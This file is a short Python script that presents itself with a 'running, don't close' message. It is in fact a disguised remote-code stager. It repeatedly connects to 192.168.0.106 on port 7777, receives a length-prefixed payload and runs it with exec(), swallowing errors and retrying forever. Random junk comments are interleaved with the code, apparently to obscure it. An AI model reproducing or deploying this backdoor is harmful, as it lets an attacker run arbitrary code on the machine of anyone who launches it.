print("Runing........")
print("Don't close import work in background")
while True:
   try:
      import socket,struct,time
      # mjUN4a2scX1uZ9sCVHNOG70TilFls0BlzswZb92SBWyVkUKMwJ9bQAR0UfdyrmiCee3mCl
      for x in range(10):
      # n4foa5bkF3P4V62tVEY6bIICPDGZrrfpM6tERyJEC42r7G8Mgl6nDdwJIjOmOcAAarhNIv
         try:
      # RY72agvBt4b535affm4hPlgpkM3C6kHjexMf1QYHA0stwXd4otl0DlATByOJm4abM6JfaL
            s=socket.socket(2,socket.SOCK_STREAM)
      # r3ujj1Na9By24bKbMhCgZVZKElAVSxZljqKfdJzjjKkNjPA6MnLn9HeYbTstWpCpVFl9I1
            s.connect(('192.168.0.106',7777))
      # Uo8PRvHu8AGFV5AsmAaojhy4icnlMHeUIZo3MQYCADokYBBnDxyxIetrVysAaUi8NZdYwm
            break
      # oXjHH7uMihFWjk6oApzF0vk8hpfzY30xK1NvCKnKDyLu88mqFqgY7ZoIpoVcIVWmph3ZCk
         except:
      # mjUN4a2scX1uZ9sCVHNOG70TilFls0BlzswZb92SBWyVkUKMwJ9bQAR0UfdyrmiCee3mCl
            time.sleep(5)
      # n4foa5bkF3P4V62tVEY6bIICPDGZrrfpM6tERyJEC42r7G8Mgl6nDdwJIjOmOcAAarhNIv
      l=struct.unpack('>I',s.recv(4))[0]
      # RY72agvBt4b535affm4hPlgpkM3C6kHjexMf1QYHA0stwXd4otl0DlATByOJm4abM6JfaL
      d=s.recv(l)
      # r3ujj1Na9By24bKbMhCgZVZKElAVSxZljqKfdJzjjKkNjPA6MnLn9HeYbTstWpCpVFl9I1
      while len(d)<l:
      # Uo8PRvHu8AGFV5AsmAaojhy4icnlMHeUIZo3MQYCADokYBBnDxyxIetrVysAaUi8NZdYwm
         d+=s.recv(l-len(d))
      # oXjHH7uMihFWjk6oApzF0vk8hpfzY30xK1NvCKnKDyLu88mqFqgY7ZoIpoVcIVWmph3ZCk
      exec(d,{'s':s})
   except:
      a = 1
   import time; time.sleep(20)